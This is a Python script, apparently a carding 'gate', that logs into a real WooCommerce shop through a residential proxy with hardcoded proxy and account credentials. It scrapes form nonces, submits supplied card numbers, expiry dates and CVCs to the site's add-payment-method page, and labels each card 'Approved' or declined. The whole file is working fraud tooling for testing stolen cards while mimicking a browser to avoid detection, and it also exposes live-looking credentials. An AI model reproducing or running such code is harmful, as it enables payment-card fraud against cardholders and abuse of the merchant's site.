import urllib3
from requests import Session
from retry_requests import retry
from configbraintreee.ConfigsBraintree import BehaviorsBraintree
import requests
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BraintreeAuthWoo:
    'Clase de la pagina que quedara como gate'
    def main(self,card):
        try: 
            self.session = requests.Session()
            self.session.proxies.update({'http://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000', 'https://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'})

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://thecatchandthehatch.com/', headers=headers)
            time.sleep(5)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://thecatchandthehatch.com/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text, 'name="woocommerce-login-nonce" value="','"')
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://thecatchandthehatch.com','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            data = {
                'username': 'yuhiro897@gmail.com',
                'password': 'Cuenta1234',
                'woocommerce-login-nonce': self.nonce_login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }
            self.session.post('https://thecatchandthehatch.com/my-account/', headers=headers, data=data)
            print(self.nonce_login)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://thecatchandthehatch.com/my-account/', headers=headers)
            time.sleep(5)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://thecatchandthehatch.com/my-account/payment-methods/', headers=headers)
            time.sleep(5)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/my-account/payment-methods/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://thecatchandthehatch.com/my-account/add-payment-method/', headers=headers)
            self.payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            print(self.payment_nonce)
            
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://thecatchandthehatch.com','priority': 'u=0, i','referer': 'https://thecatchandthehatch.com/my-account/add-payment-method/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            data = {
            'payment_method': 'paypal_pro_payflow',
            'paypal_pro_payflow-card-number': self.ccs[0],
            'paypal_pro_payflow_card_expiration_month': self.ccs[1],
            'paypal_pro_payflow_card_expiration_year': self.ccs[2],
            'paypal_pro_payflow-card-cvc': self.ccs[3],
            'woocommerce-add-payment-method-nonce': self.payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
            }
            sexo = self.session.post('https://thecatchandthehatch.com/my-account/add-payment-method/', headers=headers, data=data,)
            
            with open('readme.html', 'w') as f:
                    f.write(f'{sexo.text}')

            self.session.close()
            if 'Payment method successfully added.' in sexo.text:  return  'Approved! ✅', 'CVV2 Mismatch: 15004-This transaction cannot be processed'
            error = BehaviorsBraintree().QueryText(sexo.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == 'Payment method successfully added.': return 'Approved! ✅', 'Payment method successfully added.'
            
            else: 
                code = BehaviorsBraintree().Response(error[1].strip())
                return code






        except Exception as e:
            print(f'Error al iniciar la session: {e}')
